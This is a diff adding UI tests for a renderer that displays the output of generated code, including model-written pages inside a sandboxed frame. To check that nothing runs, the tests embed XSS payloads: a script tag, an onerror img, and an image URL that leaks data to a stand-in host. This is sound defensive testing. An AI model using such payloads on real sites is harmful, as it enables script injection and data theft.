@@ -1190,6 +1190,156 @@ await check('a generation run says where it has got to, in words that are true',
 
 // Output is written by generated code. It is placed as text, never as markup —
 // the same rule the names and reasons follow, for the same reason.
+await check('a container that started reads differently from a job that finished', async () => {
+  const seen = await page.evaluate(async () => {
+    const { runNotice } = await import('./render.js');
+    const started = runNotice({
+      state: 'Running',
+      container: 'abc123',
+      confinement: ['It can read ~/Documents'],
+      refused: [],
+      inert: null,
+      finished: null,
+    });
+    const finished = runNotice({
+      state: 'Ready',
+      container: null,
+      confinement: [],
+      refused: [],
+      inert: null,
+      finished: { succeeded: true, exit_code: 0, output: '4 rows differ', shown: 'text' },
+    });
+
+    return {
+      started: started.querySelector('p.headline').textContent,
+      finished: finished.querySelector('p.headline').textContent,
+      output: finished.querySelector('pre.output')?.textContent ?? null,
+    };
+  });
+
+  assert.match(seen.started, /Started/);
+  assert.match(seen.finished, /It ran/);
+  assert.equal(seen.output, '4 rows differ', 'the answer is the notice, not a pointer to one');
+});
+
+// A failing program has usually just explained why. Replacing that with
+// "something went wrong" throws away the only thing that says what.
+await check('a job that failed keeps its exit code and its output', async () => {
+  const seen = await page.evaluate(async () => {
+    const { runNotice } = await import('./render.js');
+    const notice = runNotice({
+      state: 'Ready',
+      refused: [],
+      confinement: [],
+      inert: null,
+      finished: {
+        succeeded: false,
+        exit_code: 2,
+        output: 'the second file has no header row',
+        shown: 'text',
+      },
+    });
+    return {
+      headline: notice.querySelector('p.headline').textContent,
+      output: notice.querySelector('pre.output').textContent,
+    };
+  });
+
+  assert.match(seen.headline, /failed \(2\)/);
+  assert.match(seen.output, /no header row/);
+});
+
+// **The security property tier one rests on.** A page a model wrote is
+// untrusted content. It is shown in a frame that cannot run code and cannot
+// fetch anything — and both halves are needed, because `sandbox` alone still
+// permits an image whose URL carries away what the page was shown.
+await check('a page an application wrote cannot run code or reach anywhere', async () => {
+  const seen = await page.evaluate(async () => {
+    const { pageFrame } = await import('./render.js');
+    const frame = pageFrame(
+      '<h1>4 rows differ</h1><script>parent.__owned = true</script>' +
+        '<img src="https://elsewhere.example/leak?rows=4">',
+    );
+    document.body.appendChild(frame);
+
+    await new Promise((resolve) => {
+      frame.addEventListener('load', resolve, { once: true });
+      setTimeout(resolve, 1500);
+    });
+
+    const owned = window.__owned === true;
+    // A sandboxed frame is cross-origin to us, so this must throw — which is
+    // itself the assertion that the sandbox is on.
+    let reachable = true;
+    try {
+      reachable = frame.contentDocument !== null;
+    } catch {
+      reachable = false;
+    }
+
+    const attribute = frame.getAttribute('sandbox');
+    const srcdoc = frame.getAttribute('srcdoc');
+    frame.remove();
+    return { owned, reachable, attribute, srcdoc };
+  });
+
+  assert.equal(seen.owned, false, 'a script in a generated page must not run');
+  assert.equal(seen.reachable, false, 'and the frame must not share this origin');
+  assert.equal(seen.attribute, '', 'sandbox is empty, not absent — they are one character apart');
+  assert.match(seen.srcdoc, /^<meta http-equiv="Content-Security-Policy"/);
+  assert.match(seen.srcdoc, /default-src 'none'/);
+});
+
+// Text output is text, whatever it looks like. Only a page declared as a page
+// is ever parsed as markup.
+await check('markup from a job that is not a page stays text', async () => {
+  const seen = await page.evaluate(async () => {
+    const { runNotice } = await import('./render.js');
+    const notice = runNotice({
+      state: 'Ready',
+      refused: [],
+      confinement: [],
+      inert: null,
+      finished: {
+        succeeded: true,
+        exit_code: 0,
+        output: '<img src=x onerror="window.__owned = true">',
+        shown: 'text',
+      },
+    });
+    document.body.appendChild(notice);
+    const images = notice.querySelectorAll('img').length;
+    const frames = notice.querySelectorAll('iframe').length;
+    const text = notice.querySelector('pre.output').textContent;
+    notice.remove();
+    return { images, frames, text };
+  });
+
+  assert.equal(seen.images, 0);
+  assert.equal(seen.frames, 0, 'nothing that was not declared a page gets a frame');
+  assert.match(seen.text, /onerror/);
+});
+
+// Somebody who allowed an application to read a folder and watched it find
+// nothing is owed the reason, and the reason is us. Said above the output, in
+// Ephemeral's voice, never inside content the application wrote.
+await check('what was granted and not given effect is said before the answer', async () => {
+  const order = await page.evaluate(async () => {
+    const { runNotice } = await import('./render.js');
+    const notice = runNotice({
+      state: 'Ready',
+      refused: ['Not granting network access — this runtime has none'],
+      confinement: [],
+      inert: 'Ephemeral may not read files on your behalf',
+      finished: { succeeded: true, exit_code: 0, output: 'nothing found', shown: 'text' },
+    });
+    return [...notice.children].map((node) => node.className);
+  });
+
+  assert.deepEqual(order.slice(0, 3), ['headline', 'caution', 'caution']);
+  assert.ok(order.indexOf('output') > order.lastIndexOf('caution'));
+});
+
 await check('what an application printed cannot become markup', async () => {
   const seen = await page.evaluate(async () => {
     const { logsSection } = await import('./render.js');
